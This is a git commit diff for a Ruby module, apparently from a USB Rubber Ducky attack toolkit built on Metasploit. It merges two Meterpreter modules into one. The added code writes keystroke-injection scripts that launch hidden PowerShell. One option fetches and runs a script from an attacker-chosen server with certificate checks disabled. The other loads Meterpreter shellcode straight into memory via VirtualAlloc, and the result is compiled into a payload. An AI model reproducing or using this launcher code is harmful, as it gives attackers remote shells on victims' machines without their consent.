129097f253df0441254def88f8b1ec8592c4c383
b00stfr3ak <goduke44@gmail.com>
2015-03-19 13:23:38 -0700

    Merged Fast_Meterpreter and Reverse_Meterpreter
    Instead of two modules there is one module that the user gets to choose
    either to do web delivery or reflective execution.

--- lib/modules/powershell/meterpreter.rb
+++ lib/modules/powershell/meterpreter.rb
@@ -1,14 +1,37 @@
-#!/usr/bine/env ruby
+#!/usr/bin/env ruby
+# Thanks to:
+# @mattifestation, @obscuresec, and @HackingDave
 require 'skeleton'
 require 'metasploit'
-class ReverseMeterpreter < Skeleton
+class Meterpreter < Skeleton
   include Msf::Options
   attr_reader :ducky
-  self.title = 'Reverse Meterpreter'
-  self.description = 'Execute Meterpreter shellcode from memory'
+  self.title = 'Launch Meterpreter'
+  self.description = 'Download and Execute meterpreter shellcode '
+  description << 'from a web server or Reflectivly load Meterpreter Localy'
+
+  def meterp_delivery
+    puts 'Meterpreter Delivery'
+    _options.each do |key, ops|
+      puts "#{key}) #{ops}"
+    end
+    @dev = rgets('Choice: ', '1')
+  end
+
+  def _options
+    { :'1' => 'Web Delivery',
+      :'2' => 'Reflectivly Load'
+    }
+  end
 
   def setup
+    meterp_delivery until  @dev == '1' || @dev == '2'
     @msf = Msf::MsfCommands.new
+    if @dev == '1'
+      @host = @server_setup.host
+      @port = @server_setup.port
+      @ssl = @server_setup.use_ssl?
+    end
     @payload = @msf.payload_select
     @msf_host = msf_host
     @msf_port = msf_port
@@ -16,26 +39,50 @@ class ReverseMeterpreter < Skeleton
 
   def run
     @shellcode = @msf.generate_shellcode(@msf_host, @msf_port, @payload)
+    return if @dev != '1'
+    server = Server::Start.new(@ssl, @host, @port)
+    if @server_setup.host_payload?
+      Thread.new { server.host_raw(powershell_command2) }
+    else
+      @uri = @server_setup.uri
+    end
   end
 
   def finish
     priv_choice = @ducky_writer.menu
     File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
       f.write(@ducky_writer.write(priv_choice))
-      f.write(powershell_command(
-              encode_command(powershell_command2(@shellcode))))
+      if @dev == '1'
+        if @ssl
+          f.write(web_powershell_command("https://#{@host}:#{@port}/#{@uri}"))
+        else
+          f.write(web_powershell_command("http://#{@host}:#{@port}/#{@uri}"))
+        end
+      else
+        f.write(reflective_powershell_command(
+          encode_command(powershell_command2)))
+      end
     end
     Ducky::Compile.new("#{@file_name}.txt")
     @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
   end
 
-  def powershell_command(encoded_command)
-    str = 'STRING powershell -nop -wind hidden -noni -enc '
-    str << "#{encoded_command}\n"
-    str << 'ENTER'
+  def web_powershell_command(url)
+    psh = 'powershell -windowstyle hidden '
+    if @ssl
+      psh << '[System.Net.ServicePointManager]::'
+      psh << 'ServerCertificateValidationCallback = { $true };'
+    end
+    psh << 'IEX (New-Object '
+    psh << "Net.WebClient).DownloadString('#{url}')"
   end
 
-  def powershell_command2(shellcode)
+  def reflective_powershell_command(encoded_command)
+    psh = 'powershell -nop -wind hidden -noni -enc '
+    psh << "#{encoded_command}"
+  end
+
+  def powershell_command2
     s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
     s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
     s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
@@ -44,7 +91,7 @@ class ReverseMeterpreter < Skeleton
     s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
     s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
     s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
-    s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
+    s << "-passthru;[Byte[]];[Byte[]]$sc = #{@shellcode};$size = 0x1000;if "
     s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
     s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
     s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
